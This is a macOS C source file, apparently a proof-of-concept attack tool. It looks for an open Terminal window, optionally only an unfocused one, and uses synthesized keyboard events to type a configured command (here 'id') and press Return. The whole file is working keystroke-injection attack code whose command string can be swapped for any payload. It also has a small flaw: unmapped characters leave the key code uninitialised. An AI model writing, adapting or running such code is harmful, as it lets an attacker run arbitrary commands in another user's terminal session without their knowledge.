#include <Carbon/Carbon.h>
#define EXEC_WHEN_FOCUSED

// command to be executed
CFStringRef cmd = CFSTR("id");

void send_key(CGKeyCode code) {
    CGEventRef event_down = CGEventCreateKeyboardEvent(NULL, code, true);
    CGEventRef event_up = CGEventCreateKeyboardEvent(NULL, code, false);
    
    CGEventPost(kCGSessionEventTap, event_down);
    CGEventPost(kCGSessionEventTap, event_up);

    CFRelease(event_down);
    CFRelease(event_up);
}

CGKeyCode char_to_code (UniChar c) {
    int ret;

    if (c == 'a') ret = 0x00;
    if (c == 's') ret = 0x01;
    if (c == 'd') ret = 0x02;
    if (c == 'f') ret = 0x03;
    if (c == 'h') ret = 0x04;
    if (c == 'g') ret = 0x05;
    if (c == 'z') ret = 0x06;
    if (c == 'x') ret = 0x07;
    if (c == 'c') ret = 0x08;
    if (c == 'v') ret = 0x09;
    if (c == 'b') ret = 0x0b;
    if (c == 'q') ret = 0x0c;
    if (c == 'w') ret = 0x0d;
    if (c == 'e') ret = 0x0e;
    if (c == 'r') ret = 0x0f;
    if (c == 'y') ret = 0x10;
    if (c == 't') ret = 0x11;
    if (c == '1') ret = 0x12;
    if (c == '2') ret = 0x13;
    if (c == '3') ret = 0x14;
    if (c == '4') ret = 0x15;
    if (c == '6') ret = 0x16;
    if (c == '5') ret = 0x17;
    if (c == '=') ret = 0x18;
    if (c == '9') ret = 0x19;
    if (c == '7') ret = 0x1a;
    if (c == '-') ret = 0x1b;
    if (c == '8') ret = 0x1c;
    if (c == '0') ret = 0x1d;
    if (c == ']') ret = 0x1e;
    if (c == 'o') ret = 0x1f;
    if (c == 'u') ret = 0x20;
    if (c == '[') ret = 0x21;
    if (c == 'i') ret = 0x22;
    if (c == 'p') ret = 0x23;
    if (c == 'l') ret = 0x25;
    if (c == 'j') ret = 0x26;
    if (c == '\'') ret = 0x27;
    if (c == 'k') ret = 0x28;
    if (c == ';') ret = 0x29;
    if (c == '\\') ret = 0x2a;
    if (c == ',') ret = 0x2b;
    if (c == '/') ret = 0x2c;
    if (c == 'n') ret = 0x2d;
    if (c == 'm') ret = 0x2e;
    if (c == '.') ret = 0x2f;
    if (c == ' ') ret = 0x31;

    return (CGKeyCode)ret;
}

int main() {
    while (1){
        CFArrayRef window_list = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID);
        
        for (CFIndex i = 0, w = CFArrayGetCount(window_list); i < w; i++) {
            CFDictionaryRef window = CFArrayGetValueAtIndex(window_list, i);

            // get window info
            CFNumberRef layer;
            CFStringRef name, owner_name;
            layer = CFDictionaryGetValue(window, @"kCGWindowLayer");
            name = CFDictionaryGetValue(window, @"kCGWindowName");
            owner_name = CFDictionaryGetValue(window, @"kCGWindowOwnerName");
#ifdef EXEC_WHEN_FOCUSED
            unsigned long focused;
            CFNumberGetValue(layer, kCFNumberSInt64Type, &focused);
            if (focused != 0) // is focused?
                continue;
#endif
            if (
                    (CFStringCompare(owner_name, CFSTR("Terminal"), 0) != kCFCompareEqualTo) // is not a terminal?
                    || (CFStringCompare(name, CFSTR(""), 0) == kCFCompareEqualTo) // is name null?
                )
            {
                continue;
            }
            //CFShow(window);

            sleep(1);
            for (CFIndex j = 0, cmd_len = CFStringGetLength(cmd); j < cmd_len; j++) {
                UniChar c = CFStringGetCharacterAtIndex(cmd, j);
                send_key(char_to_code(c));
            }

            // sleep a little bit. k? thx
            usleep(100000);
            send_key((CGKeyCode)0x24);
            
            goto bail;
        }

        CFRelease(window_list);
        continue;
bail:
        break;
    }
    return 0;
}
